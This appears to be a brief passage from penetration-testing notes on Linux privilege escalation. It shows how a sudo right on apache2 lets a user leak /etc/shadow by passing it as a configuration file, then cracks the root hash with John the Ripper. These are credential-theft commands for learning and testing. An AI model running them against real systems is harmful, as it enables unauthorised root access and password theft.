#### Detection
**Victim's Machine**
```
sudo -l
```

`/usr/sbin/apache2` is listed

#### Exploitation
**Victim's Machine**
```
sudo apache2 -f /etc/shadow
```

- `-f`: specifies a configuration file.

The attacker is tricking the system into using the `/etc/shadow` file as a configuration file. If the command succeeds, it may display the content of the shadow file.

**Attacker's Machine**
```
echo 'ROOT HASH' > hash.txt
john --wordlist=/usr/share/wordlists/nmap.lst hash.txt
```

******